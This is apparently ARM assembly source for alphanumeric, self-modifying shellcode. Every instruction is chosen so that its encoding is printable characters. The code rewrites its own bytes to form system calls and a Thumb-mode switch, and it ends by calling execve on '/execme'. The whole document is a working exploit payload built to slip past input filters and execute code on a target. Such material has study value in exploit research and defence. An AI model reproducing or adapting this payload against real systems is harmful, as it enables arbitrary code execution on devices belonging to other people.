# our shellcode starts here
    # nops
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    # do not change these instructions
    # we will use them to load a value
    # into our register
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    # continue nops
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56

    # we can't load directly from
    # PC so we must get PC into r3
    # we do this by subtracting 48 
    # from PC
    SUBMI    r3, pc, #48
    SUBPL    r3, pc, #48

    # load 56 into r3
    LDRPLB   r3, [r3, #-48]
    LDRMIB   r3, [r3, #-48]

    # Set r5 to -1
    # update the flags: result is negative
    # so we know we need MI from now on
    SUBMIS   r5, r3, #57
    SUBPLS   r5, r3, #57

    # r7 to stackpointer
    SUBMI    r7, SP, #48
    # Set r3 to 0
    # set positive flag
    SUBMIS   r3, r3, #56
    # set r4 to 0
    SUBPL    r4, r3, r3, ROR #2
    # Set r6 to 0
    SUBPL    r6, r4, r4, ROR #2

    # store registers to stack
    STMPLFD  r7, {r0, r4, r5, r6, r8, lr}^

    # r5 to -121
    SUBPL    r5, r4, #121

    # copy PC to r6
    SUBPL    r6, PC, r5, ROR #2

    SUBPL    r6, r6, r5, ROR #2
    SUBPL    r6, r6, r5, ROR #2
    SUBPL    r6, r6, r5, ROR #2
    SUBPL    r6, r6, r5, ROR #2
    SUBPL    r6, r6, r5, ROR #2
    SUBPL    r6, r6, r5, ROR #2

    # write 0 to SWI 0x414141
    # becomes: SWI 0x410041
    # OFFSET USED HERE
    # IF CODE CHANGES, CHANGE OFFSET
    STRPLB   r3, [r6, #-100]

    # put 56 back into r3
    # we are positive after this
    EORPLS   r3, r3, #56

    SUBPL    r7, r3, #57

    # write 9F to SWI 0x410041
    # becomes SWI 0x9F0041
    # we are negative after this
    EORPLS   r5, r7, #80
    # negative
    EORMIS   r5, r5, #48
    # OFFSET USED HERE
    # IF CODE CHANGES, CHANGE OFFSET
    STRMIB   r5, [r6, #-99]

    # write 2 to SWI 0x9F0041
    # becomes SWI 0x9F0002
    SUBMI r5, r3, #54 
    STRMIB   r5, [r6, #-101]

    # write 0x16 to 0x41303030
    # becomes 0x41303016
    # positive
    EORMIS   r5, r3, #66
    EORPLS   r5, r5, #108
    # OFFSET USED HERE
    # IF CODE CHANGES, CHANGE OFFSET
    STRPLB   r5, [r6, #-89]

    # write 2F to 0x41303016
    # becomes 0x412F3016
    EORPLS   r5, r3, #86
    EORPLS   r5, r5, #65
    # OFFSET USED HERE
    # IF CODE CHANGES, CHANGE OFFSET
    STRPLB   r5, [r6, #-87]

    # write FF to 0x412FFF16
    # becomes 0x412FFF16 (BXPL r6)
    # OFFSET USED HERE
    # IF CODE CHANGES, CHANGE OFFSET
    STRPLB   r7, [r6, #-88]

    # r7 = -1
    # set r3 to  -121
    SUBPL    r3, r7, #120
    #
    SUBPL    r6, r6, r3, ROR #2

    # write DF for swi to 0x3030
    # becomes 0xDF30 (SWI 48)
    # becomes negative
    EORPLS   r5, r7, #97
    EORMIS   r5, r5, #65
    # OFFSET USED HERE
    # IF CODE CHANGES, CHANGE OFFSET
    STRMIB   r5, [r6, #-73]

    # Set positive flag
    EORMIS   r7, r4, #56

    # load arguments for SWI
    # r0 = 0, r1 = -1, r2 = 0
    SUBPL    r5, SP, #48
    # We use LDMPLFA, because it's one of the few instructions
    # we can use to write to the registers R0 to R2.
    # Other instructions generate non-alphanumeric characters
    LDMPLFA  r5!, {r0, r1, r2, r6, r8, lr}

    # Set r7 to -1
    # Negative after this
    SUBPLS   r7, r7, #57

    # This will become: 
    # SWIMI 0x9f0002    
    SWIMI    0x414141

    # Set positive flag again
    EORMIS   r5, r4, #56

    # set thumb mode
    SUBPL    r6, pc, r7, ROR #2
    
    # this should be BXPL r6
    # but in hex that's
    # 0x51 0x2f 0xff 0x16, so we 
    # overwrite the 0x30 above
    .byte    0x30,0x30,0x30,0x51

    .THUMB
    .ALIGN 2
    # We assume r2 is 0 before 
    # entering Thumb mode

    # copy pc to r0
    mov    r0, pc

    # OFFSET USED HERE
    # IF CODE CHANGES, CHANGE OFFSET
    # misalign r0 to address of 1execme2 - 47
    # we will write to r0+47 and r0+54
    # (beginning of the string)
    add    r0, #100
    sub    r0, #105

    # set r1 to 0
    mul    r1, r2
    # set r1 tp 47
    add    r1, #97
    sub    r1, #50
    # store r1 ('/') at r0+47
    # string becomes /execme2
    strb   r1, [r0, r1]

    # set r1 to 0
    mul    r1, r2
    # set r1 to 54
    add    r1, #54
    # store 0 at r0+54
    # string becomes /execme\0
    strb   r2, [r0, r1]

    # set r1 to 0
    mul    r1, r2
    # set r1 to -1
    add    r1, #48
    sub    r1, #49
    # set r7 to 1
    neg    r7, r1

    # set r1 to 0
    mul    r1, r2
    # set r1 to 11 (0xb), 
    # the exec system call code
    add    r1, #65
    sub    r1, #54
    # our systemcall code must be in r7
    # r7 = 1, r1 contains the code
    mul    r7, r1

    # set r1 to 0 (first parameter of execve)
    mul    r1, r2

    # set r0 to beginning of the string
    add    r0, #97
    sub    r0, #50

    # This wil become: swi  48
    .byte  0x30,0x30 
    # This is a nop used for 
    # alignment
    add    r7, #50
    # our command
    .ascii "1execme2"
    # nops used for alignment
    add    r7, #50
    add    r7, #50

